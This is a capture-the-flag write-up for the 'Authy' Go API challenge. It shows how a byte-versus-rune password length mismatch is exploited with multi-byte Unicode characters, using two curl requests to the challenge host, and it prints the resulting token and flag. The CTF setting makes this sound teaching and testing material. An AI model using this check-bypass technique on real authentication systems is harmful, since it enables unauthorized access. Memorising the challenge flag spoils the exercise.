# Authy

## Description

> I have just learned Golang and trying to build a small authentication platform with it. It's a simple API so it should be secure right ?

## Write-Up

In `/registration`

```go
if len(user.Password) < 6 {
     log.Error("Password too short")
     resp := c.JSON(http.StatusConflict, helper.ErrorLog(http.StatusConflict, "Password too short", "EXT_REF"))
     return resp
}
```

In `/login`

```go
password := []rune(user.Password)
result.Token = helper.JwtGenerator(result.Username, result.Firstname, result.Lastname, os.Getenv("SECRET"))
if len(password) < 6 {
     flag := os.Getenv("FLAG")
     res := &Flag{
          Flag: flag,
     }
     resp := c.JSON(http.StatusOK, res)
     log.Info()
     return resp
}
```

More precisaly

```go
password := []rune(user.Password)
```

> `[]rune:` `[]rune` is a slice of runes. Runes in Go represent Unicode code points, which can be used to work with characters from various languages and symbol sets. Converting a string to a slice of runes allows you to access and manipulate individual characters more easily, especially in cases where multi-byte characters are involved.
>
> **String to Runes Conversion:**
>
> ```go
>
> str := "Hello, 世界" // A string containing both ASCII and non-ASCII characters
> runes := []rune(str) // Convert the string to a slice of runes
> 
> ```
>
> In the example above, the string "Hello, 世界" contains a mix of ASCII characters and non-ASCII characters (Chinese characters). Converting the string to a slice of runes allows you to work with each character individually, even if they are represented by multiple bytes in the original string due to Unicode encoding.

From there, we can think about **Text Normalization** Attack, where we use chars that can be interpreted as multiple chars when going through length processing, but with runes, it is considered as single chars :

> In Unicode and text normalization, there are certain situations where a single character, when normalized, may be represented as two or more characters. This typically happens with characters that have diacritics (accent marks), composed characters, or characters with compatibility mappings. Text normalization, specifically Unicode Normalization Forms (NFD, NFC, NFKD, NFKC), is used to ensure that equivalent sequences of characters are represented in a consistent way.
> 
> Here are a few examples of situations where a single character can be represented as two or more characters after normalization:
> 
>    **1.Diacritic Characters:** Some languages use diacritics (accent marks) to modify characters. In Unicode, these diacritics can be separate characters or combined with the base character. Normalization may result in combining or decomposing these characters. For example:
>
>    The character "é" (Latin small letter e with acute accent) can be represented as a single code point or as two code points: "e" + "´" (base character + combining acute accent).
>
>    **2.Composed Characters:** Some scripts allow characters to be composed of multiple elements. Normalization may decompose these composed characters into their constituent parts. For example:
>
>    The Devanagari script has characters like "क्ष" (ka + sha), which may be decomposed into two code points: "क" + "्" + "ष" (ka + virama + sha) after normalization.
>

So Let's try it out, First we register :

```
└─$ curl -X POST -H "Content-Type: application/json" -d '{"Username": "rivenche", "Firstname": "walid", "Lastname": "bembem", "Password": "žůžož"}' http://ae7297884e2848fbfea88.playat.flagyard.com/registration
```

We get :

```
{"username":"rivenche","firstname":"walid","lastname":"bembem","password":"$2a$05$JnHtLiI9fDx892T/.7G0N.mSYBFxOMXsj6LtShdlPeYh43wtZW.dq","token":"eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJmaXJzdG5hbWUiOiJ3YWxpZCIsImxhc3RuYW1lIjoiYmVtYmVtIiwidXNlcm5hbWUiOiJyaXZlbmNoZSJ9.B2u2LZo3AgRfUDYz2lj27B1bMJh3nTuLeJnjlRca4NQ","date_created":"2023-10-08 16:19:13"}
```

From there, we try to login:

```
curl -X POST -H "Content-Type: application/json" -d '{"Username": "rivenche", "Password": "žůžož"}' http://ae7297884e2848fbfea88.playat.flagyard.com/login       
```

It gives us

```
{"flag":"BHFlagY{1823549c0056eb82b92c2a98dfc83624}"}
```

## Flag

BHFlagY{1823549c0056eb82b92c2a98dfc83624}


## More Information

- https://0xacb.com/normalization_table
- https://appcheck-ng.com/wp-content/uploads/unicode_normalization.html
- https://stackoverflow.com/questions/26722450/remove-diacritics-using-go